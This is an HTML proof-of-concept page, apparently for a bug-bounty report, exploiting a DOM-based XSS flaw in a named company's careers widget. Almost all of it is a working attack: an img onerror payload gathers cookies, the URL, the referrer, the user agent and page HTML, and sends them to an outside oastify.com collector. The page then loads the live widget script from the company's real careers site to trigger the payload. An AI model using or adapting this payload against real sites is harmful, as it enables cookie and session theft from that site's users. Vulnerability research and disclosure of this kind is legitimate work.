<!DOCTYPE html>
<html>
<head>
  <title>ðŸ”¥ Just Eat Widget XSS PoC</title>
</head>
<body>
  <h2>DOM-Based XSS in Just Eat Careers Widget</h2>

  <!-- DOM XSS trigger via vulnerable enhancer -->
  <div class="ph-widget" as-element="exploitWidget">
    <img src=x onerror="
      (() => {
        let d = ''
          + document.cookie + '\\n'
          + location.href + '\\n'
          + document.referrer + '\\n'
          + navigator.userAgent + '\\n'
          + document.documentElement.outerHTML.slice(0, 1500);
        new Image().src = 'https://w63mft1b11m7qutvquknb5s1hsnobkz9.oastify.com/log?x=' + encodeURIComponent(d);
      })();
    ">
  </div>

  <!-- Trigger the vulnerable widget JS -->
  <script src="https://careers.justeattakeaway.com/global/en/phenomtrack.min.js"></script>
  <script>
    setTimeout(() => {
      if (window.PhEnhancer) PhEnhancer();
    }, 100); // small delay to avoid race condition
  </script>
</body>
</html>
